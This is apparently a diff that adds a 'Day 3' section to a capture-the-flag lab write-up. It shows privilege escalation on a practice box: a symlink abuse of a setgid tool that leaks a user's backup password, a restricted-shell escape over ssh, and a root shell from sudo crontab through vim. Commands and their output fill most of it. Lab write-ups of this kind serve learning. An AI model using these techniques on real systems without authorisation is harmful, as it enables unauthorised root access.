@@ -397,3 +397,100 @@ root shell using that, but I'm more interested in trying to escalate to jeff fir
 We have some more stuff to look into, the python library hijack, files owned by
 jeff, linpeas found /etc/vsftpd.conf.bak so maybe the ftp server have some holes
 in its configuration. But lets pause it for now.
+
+Day 3:
+Files owned by jeff:
+backupmgr@tryharder$ find / -user jeff -type f -exec ls -lh {} \; 2>/dev/null
+-rwxr-sr-x 1 jeff pwman 17K May 24  2020 /opt/systools/systool
+-rwxr-x--- 1 jeff pwman 43 May 11  2020 /var/backups/jeff.bak
+
+systool also have the suid bit set.
+
+There is also a message.txt in /opt/systools:
+backupmgr@tryharder$ cat /opt/systools/message.txt
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+
+And message.txt is printed when running systool and choosing option 2:
+backupmgr@tryharder:/opt/systools$ ./systool
+./systool
+Welcome to Jeffs System Administration tool.
+This is still a very beta version and some things are not implemented yet.
+Please Select an option from below.
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit
+Chose your option: 2
+2
+
+
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+
+When choosing option 1, ps seems to be executed. If the absolute path isn't used,
+that means that we could place a ps-executable bash script in /opt/systools/ and
+have it execute a shell.
+
+Sadly, through inspecting systool with strings we see that the path /bin/ps is used.
+
+I also tried replacing the contents of message.txt with 2000 'a' characters to
+see if there were the possibility for buffer overflow attacks, but the output
+string was limited to a few hundred characters (never counted them all).
+
+At this point I peeked in the walkthrough, and got a hint at something that I
+should have realized myself. This program runs as the group pwman, meaning that
+it can access any files owned by that group. This includes /var/backups/jeff.bak.
+So if we replace message.txt with a symlink to jeff.bak, we should be able to
+see what is in it.
+
+backupmgr@tryharder$ ln -s /var/backups/jeff.bak /opt/systools/message.txt
+backupmgr@tryharder$ ls -l /opt/systools/message.txt
+lrwxrwxrwx 1 backupmgr backupmgr 21 Aug 21 13:40 message.txt -> /var/backups/jeff.bak
+
+Bingo!
+backupmgr@tryharder$ ./systool
+Welcome to Jeffs System Administration tool.
+This is still a very beta version and some things are not implemented yet.
+Please Select an option from below.
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit
+Chose your option: 2
+2
+
+
+Your Password is: 123-My-N4M3-1z-J3ff-123
+
+And we can use this to ssh into the target as jeff.
+
+When we try to execute a command, we notice that we have a restricted shell:
+-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
+
+We can get around this by specifying the shell in the ssh-command:
+$ ssh jeff@10.10.65.185 -t 'bash --noprofile'
+jeff@10.10.65.185's password:
+jeff@tryharder:~$ id
+uid=1000(jeff) gid=1000(jeff) groups=1000(jeff),1002(pwman)
+
+The --noprofile option is explained here:
+https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html
+
+sudo -l shows that we can run /usr/bin/crontab as sudo:
+jeff@tryharder:~$ sudo -l
+[sudo] password for jeff:
+Matching Defaults entries for jeff on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jeff may run the following commands on tryharder:
+    (ALL) /usr/bin/crontab
+
+We are in luck! The editor for crontab is vi/vim, which means that we can use it
+to get a shell:
+
+jeff@tryharder:~$ sudo crontab -e
+
+We can use ! in vim to execute commands, so if we do !/bin/sh we get a root shell:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+And we can find the root-flag:
+# file /root/root.txt
+/root/root.txt: ASCII text
